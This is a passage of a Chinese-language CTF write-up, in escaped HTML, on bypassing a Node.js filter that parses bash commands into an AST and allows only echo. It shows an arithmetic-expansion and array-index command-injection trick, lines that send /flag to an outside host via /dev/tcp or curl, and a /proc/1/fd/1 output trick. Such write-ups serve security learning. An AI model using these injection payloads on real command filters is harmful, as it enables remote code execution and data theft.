style=\"color:#a6e22e\"\u003eprop\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e===\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Command\u0026#39;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;text\u0026#39;\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;text\u0026#39;\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;echo\u0026#39;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003echeck\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003eprop\u003c/span\u003e])) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e};\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然後用 \u003ca href=\"https://vorpaljs.github.io/bash-parser-playground/\"\u003ebash-parser-playground\u003c/a\u003e 看看 ast 的結構。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Script\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;commands\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Command\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;echo\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Word\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;suffix\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;aaa\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Word\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;LogicalExpression\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;op\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;and\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;left\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Command\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ls\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Word\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;suffix\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;aaa\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Word\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;right\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Pipeline\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;commands\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Command\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#f92672\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ls\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Word\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003e\u0026#34;suffix\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bbb$(ls ddd)\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003e\u0026#34;expansion\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                  {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;loc\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;start\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;end\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;command\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ls ddd\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;CommandExpansion\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;commandAST\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Script\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;commands\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                          \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Command\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                          \u003cspan style=\"color:#f92672\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            \u003cspan style=\"color:#f92672\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ls\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Word\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                          },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                          \u003cspan style=\"color:#f92672\"\u003e\u0026#34;suffix\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                              \u003cspan style=\"color:#f92672\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ddd\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                              \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Word\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                          ]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      ]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                ],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Word\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Command\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#f92672\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ls\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Word\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003e\u0026#34;suffix\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ccc\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Word\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e這邊試了部分 command injection 的手法，但可以看到都有成功辨識成 \u003ccode\u003eCommand\u003c/code\u003e，而 \u003ccode\u003echeck\u003c/code\u003e function 的檢查是 recursive 的，所以理論上上面的這些 payload 檢查都不會過。\u003c/p\u003e\n\u003ch3 id=\"解題\"\u003e解題\u003c/h3\u003e\n\u003cp\u003e首先再仔細看看 \u003ccode\u003echeck\u003c/code\u003e function\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eprop\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e===\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;type\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003eprop\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e===\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Command\u0026#39;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;text\u0026#39;\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;text\u0026#39;\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;echo\u0026#39;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e其中 \u003ccode\u003east['name']['text']\u003c/code\u003e 會有問題，由於 js week type 的特性，當字串為空值的時候會是 \u003ccode\u003efalse\u003c/code\u003e，因此除了 command 為 echo 的指令以外 command 為空值的指令也能用。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f83386d9-1572-4520-816e-227a790e5dcd\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e那在何種情況 command 會是空值呢？這邊發現在定義 \u003ccode\u003eenvironment variable\u003c/code\u003e 的時候 command 會是空值。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/793f7e9d-0597-462b-8b41-898f8dce1d83\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e也就是說我們除了下 \u003ccode\u003eecho\u003c/code\u003e 以外也可以定義 \u003ccode\u003eenvironment variable\u003c/code\u003e，那這能做甚麼，這就能利用 bash 裡面 \u003ccode\u003eArithmetic Expansion\u003c/code\u003e 也就是 \u003ccode\u003e$((1+1))\u003c/code\u003e 以及 array 也就是 \u003ccode\u003earr=(aa bb); echo ${arr[0]}\u003c/code\u003e 這個兩個功能的特性。\u003c/p\u003e\n\u003cp\u003e首先 \u003ccode\u003eArithmetic Expansion\u003c/code\u003e 裡面如果出現 variable 的話她會\u003cstrong\u003e自動\u003c/strong\u003e把 variable 內的表達式做展開，也就是 \u003ccode\u003etest='1+1'; echo $((test+1))\u003c/code\u003e 你會得到 \u003ccode\u003e$(((1+1)+1))\u003c/code\u003e 也就是 3。\u003c/p\u003e\n\u003cp\u003e再來 array 如果在 \u003ccode\u003eArithmetic Expansion\u003c/code\u003e 內，並且她的 index 有 \u003ccode\u003ecommand substitution\u003c/code\u003e 也就是 \u003ccode\u003e$()\u003c/code\u003e 的話一樣會執行 command，也就是說 \u003ccode\u003earr=(1 2); echo $((arr[$(echo 1)]+1))\u003c/code\u003e 這樣會得到 \u003ccode\u003e$((arr[1]+1))\u003c/code\u003e 展開後是 \u003ccode\u003e$((2+1))\u003c/code\u003e 也就是 3。\u003c/p\u003e\n\u003cp\u003e利用這兩點我們可以組合出這個 \u003ccode\u003epayload='arr[$(RCE)]'; echo $(( payload == 1 ));\u003c/code\u003e 再 \u003ccode\u003eRCE\u003c/code\u003e 的位置可以放任意指令並執行，這點我們可以用這個指令做測試 \u003ccode\u003earr='1' payload='arr[$(echo 0)]'; echo $(( payload == 1 ))\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/96e9b383-0109-4222-9fe2-d27e3f52a256\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e但是用這種方式所造成的 RCE 沒辦法使用 STDOUT 輸出任何東西，因此要另外想回傳 flag 的方發，遠本試過用網路回傳如：\u003ccode\u003epayload='arr[$(cat /flag \u0026gt; /dev/tcp/\u0026lt;IP\u0026gt;/\u0026lt;PORT\u0026gt;)]'; echo $(( payload == 1 ));\u003c/code\u003e 或者 \u003ccode\u003epayload='arr[$(curl \u0026lt;URL\u0026gt;/$(cat /flag))]'; echo $(( payload == 1 ));\u003c/code\u003e 等等方法，但都沒成功，於是我試架一次他的環境，發現他的環境沒有 \u003ccode\u003e/dev\u003c/code\u003e 然後我把 \u003ccode\u003enc\u003c/code\u003e 放進去以後發現環境沒網路，所以沒辦法用網路傳 flag 回來。\u003c/p\u003e\n\u003cp\u003e最後發現他有 \u003ccode\u003e/proc\u003c/code\u003e 所以試著用 \u003ccode\u003epayload='arr[$(cat /flag \u0026gt; /proc/$$/fd/1)]'; echo $(( payload == 1 ));\u003c/code\u003e 不知道為何依然沒成功，後來我發現他的 nodejs 程式每次執行一定再 pid 1 所以我就用 \u003ccode\u003epayload='arr[$(cat /flag \u0026gt; /proc/1/fd/1)]'; echo $(( payload == 1 ));\u003c/code\u003e 就成功拿到 flag 了。\u003c/p\u003e\n\u003ch3 